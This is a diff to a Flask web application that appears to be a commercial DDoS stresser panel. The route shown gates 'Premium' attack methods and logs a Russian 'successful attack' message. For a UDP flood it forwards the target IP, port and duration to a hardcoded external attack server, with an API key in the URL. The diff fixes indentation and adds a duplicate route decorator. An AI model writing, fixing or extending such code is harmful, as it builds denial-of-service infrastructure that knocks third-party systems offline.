@@ -132,6 +132,7 @@ def index3():
 
 
 @app.route('/launch_attack', methods=['POST'])
+@app.route('/launch_attack', methods=['POST'])
 def launch_attack():
     if 'username' not in session:
         return redirect(url_for('login'))
@@ -159,10 +160,11 @@ def launch_attack():
             return "Method not valid", 403
 
     else:
-    if method not in free_methods:
-        flash('Method ini hanya tersedia untuk user Premium!')
-        return redirect(url_for('attack'))
-        
+        if method not in free_methods:
+            flash('Method ini hanya tersedia untuk user Premium!')
+            return redirect(url_for('index'))
+
+    # lanjut kode attack di bawah sini
     print(f"Успешная атака! Цель: {target}, Порт: {port}, Время: {duration} секунд, Метод: {method}")
     if method == "UDPFLOOD":
         url = f"http://217.144.185.177:5000/attack?type=L4&ip={target}&port={port}&method={method}&time={duration}&key=kriskaUSDEGR454T"
